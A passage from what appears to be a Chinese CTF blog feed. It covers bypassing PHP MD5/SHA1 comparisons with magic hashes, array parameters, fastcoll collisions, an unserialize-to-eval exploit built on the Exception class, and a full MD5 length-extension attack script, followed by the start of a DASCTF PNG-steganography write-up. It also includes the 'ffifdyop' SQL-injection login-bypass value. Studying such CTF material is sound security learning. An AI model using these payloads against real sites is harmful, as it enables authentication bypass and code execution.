class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$a</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只需要md5加密之后等于自己就行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a=0e215962017<br></code></pre></td></tr></table></figure><p>做下记录就行</p><h3 id="Q3-登入用户Md5-万能密码"><a href="#Q3-登入用户Md5-万能密码" class="headerlink" title="Q3:登入用户Md5(万能密码)"></a>Q3:登入用户Md5(万能密码)</h3><p>这个常见于登陆界面</p><p>可以参考这个文章，<a href="https://blog.csdn.net/qq_44879989/article/details/133363370">文章</a></p><p><code>ffifdyop</code> 经过两次转化后得到的结果是 <code>&#39;or&#39;6�]��!r,��b</code>。位于 <code>or</code> 两侧的单引号可以用于闭合两端的单引号，使得 <code>or</code> 不再被 MySQL 认为是字符串，而是一个关键字，发挥着 <code>逻辑或运算符</code> 的作用,以下是常见的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ffifdyop<br>129581926211651571912466741651878684928<br></code></pre></td></tr></table></figure><h3 id="Q4-Md5双层嵌套"><a href="#Q4-Md5双层嵌套" class="headerlink" title="Q4:Md5双层嵌套"></a>Q4:Md5双层嵌套</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">md5(md5($a))==md5($a)<br></code></pre></td></tr></table></figure><p>列举几个例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure><p>可本地自己测试</p><h2 id="PHP强类型"><a href="#PHP强类型" class="headerlink" title="PHP强类型"></a>PHP强类型</h2><h3 id="Q1-二者强比较"><a href="#Q1-二者强比较" class="headerlink" title="Q1:二者强比较"></a>Q1:二者强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>&amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are right!&quot;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以用数组进行绕过</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="Q2-二者强比较-类限制"><a href="#Q2-二者强比较-类限制" class="headerlink" title="Q2:二者强比较(类限制)"></a>Q2:二者强比较(类限制)</h3><p>当限制在类中无法利用数组，可以尝试md5碰撞，这里推荐工具fastcoll</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/1.png" alt="1"></p><p>然后工具执行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/2.png" alt="2"></p><p>接下来写一个例题就行比较一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\1.txt&quot;</span>);<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;C:\Users\30226\Desktop\ctftool\tools\fastcoll\2.txt&quot;</span>);<br><br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bb</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aa</span>===<span class="hljs-variable">$bb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$aaa</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>===<span class="hljs-variable">$bbb</span>)<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;erro&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/3.png" alt="3"></p><h3 id="Q3-MD5和sha1强比较"><a href="#Q3-MD5和sha1强比较" class="headerlink" title="Q3:MD5和sha1强比较"></a>Q3:MD5和sha1强比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span>, <span class="hljs-variable">$var2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$var1</span> = <span class="hljs-variable">$var1</span>;<br>        <span class="hljs-variable">$var2</span> = <span class="hljs-variable">$var2</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;var1 != <span class="hljs-variable language_">$this</span>-&gt;var2) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var2)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var1) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;var2))) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;var1);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里可以利用php的EXCEPTION异常类进行绕过，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>&#125; <br><br><span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;phpinfo();?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-variable">$tr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cianiao</span>();<br><span class="hljs-variable">$tr</span>-&gt;var1=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$tr</span>-&gt;var2=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$tr</span>));<br><br></code></pre></td></tr></table></figure><p>输入可以进行绕过，原理是采用<code>Exception</code>类绕过<code>md5</code>、<code>sha1</code>等哈希函数的强等于（<code>===</code>）检查，因为在特定情况下，PHP的类型转换机制会导致哈希碰撞被误解为相等。这种类型转换的特性可以通过抛出异常并捕获它们来实现。</p><p>ps:路径长度和包含的特殊字符（如中文字符）在序列化和反序列化过程中可能会出现编码问题，尤其是在不同环境中（如不同版本的 PHP，不同的操作系统）处理这些路径时，会导致路径解析错误或乱码，从而影响程序的正常执行。因此我的没有显示页面，但是也显示了字符串。</p><h3 id="Q4-MD5长度拓展攻击"><a href="#Q4-MD5长度拓展攻击" class="headerlink" title="Q4:MD5长度拓展攻击"></a>Q4:MD5长度拓展攻击</h3><p>先上个例题吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$secret</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>);<span class="hljs-comment">//告诉你他的MD5吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;orange&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$orange</span>,-<span class="hljs-number">6</span>)!==<span class="hljs-string">&#x27;orange&#x27;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125;<br><span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$orange</span>)===<span class="hljs-variable">$md5</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>已知secret的MD5值，secret的长度为32,orange的末尾值是orange，需要得到最后的等式，我们不讲原理，直接做题吧</p><p>贴上解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.A, self.B, self.C, self.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        self.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        self.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = self.A, self.B, self.C, self.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                self._lrot((a + f + self.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, self.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        self.A = (self.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        self.B = (self.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        self.C = (self.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        self.D = (self.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            self.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, self.A, self.B, self.C, self.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p>本例题出题并不严谨，只是告诉一种情况</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/4.png" alt="4"></p><p>把对应的内容填上去即可。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Md5</tag>
      
      <tag>sha1</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dasctf夏-复盘</title>
    <link href="/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>孱弱，打是一打一个不吱声的，赛后跟着师傅复现一下</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="png-master"><a href="#png-master" class="headerlink" title="png_master"></a>png_master</h2><p><img src="/../../images/DASCTF/2024%E5%A4%8F/flag.png" alt="flag"></p><p>第一部分：010分析，结尾有类似base64解密的部分提取出来解密</p><p>得到第一段内容</p><p>Congratulations on finding the first paragraph of flag, but the understanding of png is just beginning.<br><strong>flag1:DASCTF{2fd9e9ff-e27</strong></p><p>第二部分：</p><p>使用stegsolve来获得</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/1.png" alt="1"></p><p><strong>flag2:d-5405-c5f5-</strong></p><p>第三部分:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>Image=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/DASCTF/tempdir/MISC附件/flag.png&#x27;</span>)<br>Image.save(<span class="hljs-string">&#x27;a.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>利用010进行对比发现IDAT多了一个很长的部分</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/2.png" alt="2"></p><p>把这部分单独读取出来，加上png头，得到图片</p><p><img 